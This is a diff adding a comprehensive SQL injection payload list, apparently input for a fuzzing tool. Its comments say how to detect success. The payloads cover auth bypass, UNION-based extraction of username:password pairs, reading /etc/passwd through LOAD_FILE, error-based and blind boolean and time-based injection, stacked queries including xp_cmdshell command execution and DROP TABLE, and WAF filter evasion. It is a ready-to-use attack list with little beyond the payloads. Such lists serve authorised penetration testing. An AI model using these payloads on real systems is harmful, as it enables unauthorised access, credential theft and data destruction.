@@ -1,0 +1,147 @@
+# ==================================================================
+#  SQL INJECTION PAYLOADS  —  comprehensive (no basic tier)
+#  One payload per line. "#" lines are comments (pyintruder skips them).
+#  "-- -" is a universal comment (trailing char keeps the required space).
+#  Try BOTH contexts: string (payloads starting with ') and numeric ("1 ...").
+#  Detection: a SQL error, a changed response length/status, or — for the
+#  TIME payloads — a response that HANGS ~5s. Watch the duration, not the 200.
+#  Transmit-safe raw: no literal '#'/'&'. ( '+' becomes a space server-side,
+#  which is the intended SQL space; '%09' becomes a tab — both are fine. )
+# ==================================================================
+
+# ---- 1. Detection — does input reach the query? ----
+'
+"
+`
+\
+''
+')
+';
+'-- -
+")-- -
+'-- -
+' AND '1'='1
+' AND '1'='2
+1 AND 1=1
+1 AND 1=2
+1' AND '1'='1
+1' AND '1'='2
+' OR '1'='1
+1' ORDER BY 1-- -
+1' ORDER BY 100-- -
+1)-- -
+1))-- -
+'))-- -
+
+# ---- 2. Auth bypass (username / login field) ----
+' OR '1'='1'-- -
+' OR 1=1-- -
+admin'-- -
+admin')-- -
+admin'/*
+' OR 1=1 LIMIT 1-- -
+' OR '1'='1' LIMIT 1-- -
+') OR ('1'='1'-- -
+') OR '1'='1'-- -
+") OR ("1"="1"-- -
+") OR "1"="1"-- -
+' OR '1'='1
+" OR "1"="1
+' OR 1=1 OR '1'='1
+' OR 'x'='x'-- -
+' OR 1-- -
+admin' AND 1=1-- -
+' UNION SELECT 1,'admin','pass'-- -
+
+# ---- 3. UNION — column count (increment until the error stops) ----
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -
+' ORDER BY 4-- -
+' ORDER BY 5-- -
+' ORDER BY 6-- -
+' ORDER BY 7-- -
+' ORDER BY 8-- -
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
+
+# ---- 4. UNION — find printed columns & pull data ----
+' UNION SELECT 1,2,3-- -
+-1' UNION SELECT 1,2,3-- -
+' UNION SELECT 1,2,3,4-- -
+' UNION SELECT @@version,NULL,NULL-- -
+' UNION SELECT version(),NULL,NULL-- -
+' UNION SELECT banner,NULL,NULL FROM v$version-- -
+' UNION SELECT user(),database(),version()-- -
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT concat(username,0x3a,password),NULL,NULL FROM users-- -
+' UNION SELECT group_concat(username,0x3a,password),NULL,NULL FROM users-- -
+' UNION SELECT string_agg(usename,',') ,NULL,NULL FROM pg_user-- -
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -
+
+# ---- 5. Error-based extraction (data leaks in the SQL error) ----
+' AND extractvalue(1,concat(0x7e,version()))-- -
+' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
+' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
+' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+' AND 1=CONVERT(int,@@version)-- -
+' AND 1=CAST((SELECT version()) AS int)-- -
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -
+' AND 1=(SELECT 1/0 FROM dual)-- -
+' AND 1=UTL_INADDR.get_host_address((SELECT user FROM dual))-- -
+
+# ---- 6. Blind — boolean (page differs true vs false) ----
+' AND 1=1-- -
+' AND 1=2-- -
+' AND 'a'='a
+' AND 'a'='b
+' AND SUBSTRING(version(),1,1)='8'-- -
+' AND SUBSTRING((SELECT database()),1,1)='a'-- -
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>77-- -
+' AND (SELECT COUNT(*) FROM users)>0-- -
+' AND LENGTH(database())>4-- -
+' AND EXISTS(SELECT * FROM users)-- -
+
+# ---- 7. Blind — time-based (response HANGS ~5s when true) ----
+' AND SLEEP(5)-- -
+' AND IF(1=1,SLEEP(5),0)-- -
+' AND IF(SUBSTRING(version(),1,1)='8',SLEEP(5),0)-- -
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+' RLIKE SLEEP(5)-- -
+1 AND SLEEP(5)
+1 OR SLEEP(5)
+'; WAITFOR DELAY '0:0:5'-- -
+' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -
+'; SELECT pg_sleep(5)-- -
+' AND (SELECT 1 FROM PG_SLEEP(5))IS NOT NULL-- -
+' || (SELECT dbms_pipe.receive_message(('a'),5) FROM dual)-- -
+' AND 1=(CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END)-- -
+
+# ---- 8. Stacked queries (MSSQL / PostgreSQL) ----
+'; SELECT 1-- -
+1; SELECT 1
+'; WAITFOR DELAY '0:0:5'-- -
+'; DROP TABLE IF EXISTS x-- -
+'; EXEC xp_cmdshell 'whoami'-- -
+
+# ---- 9. WAF / filter bypass ----
+'/**/OR/**/1=1-- -
+'/*!50000OR*/1=1-- -
+'%09OR%091=1-- -
+'%0aOR%0a1=1-- -
+'+OR+1=1-- -
+' OR 1 LIKE 1-- -
+' OR 1 BETWEEN 1 AND 1-- -
+' OR 0x31=0x31-- -
+' OR 'a'RLIKE'a'-- -
+' UnIoN SeLeCt 1,2,3-- -
+'/**/UNION/**/SELECT/**/1,2,3-- -
+'+UNION+SELECT+1,2,3-- -
+' UNION SELECT 1,2,3 FROM dual-- -
+' UNION ALL SELECT 1,2,3-- -
+' /*!UNION*/ /*!SELECT*/ 1,2,3-- -
